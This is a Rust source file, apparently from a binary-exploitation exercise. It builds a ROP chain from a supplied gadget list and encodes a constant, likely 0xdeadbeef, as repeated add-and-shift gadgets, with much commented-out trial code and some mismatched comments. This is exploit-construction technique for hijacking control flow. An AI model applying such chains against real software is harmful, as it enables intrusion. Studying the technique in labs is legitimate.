fn make_loopy(mass_i: Vec<i32>, ropchain: &mut [usize], mut index: usize, gadgets: Vec<usize>) -> usize {
    for (pos, i) in mass_i.iter().enumerate() {
        // Add (gadget2: add rdi, 1)
        for _ in 0..*i {
            ropchain[index] = gadgets[2]; // gadget2: add rdi, 1
            index += 1;

            // Shift (gadget3: shl rdi, 1)
            ropchain[index] = gadgets[3]; // gadget3: shl rdi, 1
            index += 1;
        }

        // Shift after finishing the adds for this loop iteration
        if pos != mass_i.len() - 1 && pos != mass_i.len() {
            ropchain[index] = gadgets[3]; // gadget3: shl rdi, 1
            index += 1;
        }
    }

    index // Return the updated index
}

pub fn make_ropchain(ropchain: &mut [usize]) -> &[usize] {
    let gadgets = super::gadgets();
    let mut index = 0;


    ropchain[index] = gadgets[1]; // gadget1: pop rax
    index += 1;


    ropchain[index] = gadgets[0];
    index += 1;// gadget0: mov [rsp + 8], rdi

    ropchain[index] = gadgets[4];
    index += 1;

    // // Start with rdi = 0 (gadget4: xor rdi, rdi)
    // ropchain[index] = gadgets[4];
    // index += 1;// gadget4: xor rdi, rdi
    // //
    // // // Create the sequence to build 0xdeadbeef
    //let mass_i: Vec<i32> = vec![4, 3, 5, 2, 2, 1, 1, 4, 2];
    let mass_i: Vec<i32> = vec![2, 4, 1, 1, 2, 2, 5, 3, 3];
    // //
    // // // Use make_loopy to execute the shifts and adds
    index = make_loopy(mass_i, ropchain, index, gadgets.clone());
    // //

    // ropchain[index] = gadgets[4];
    // index += 1;
    // // Move the result from rdi to rax (gadget1: pop rax)
    // ropchain[index] = gadgets[1]; // gadget1: pop rax
    // index += 1;
    //
    //
    // ropchain[index] = gadgets[0];
    // index += 1;// gadget0: mov [rsp + 8], rdi
    //
    // ropchain[index] = gadgets[4];
    // index += 1;
    //
    // ropchain[index] = gadgets[2];
    // index += 1;


    ropchain[index] = gadgets[2]; // gadget2: add rdi, 1
    index += 1;

    ropchain[index] = gadgets[0];
    index += 1;// gadget0: mov [rsp + 8], rdi

    ropchain[index] = gadgets[1]; // gadget1: pop rax
    index += 1;

    // Return the constructed ROP chain
    &ropchain[..index]
}
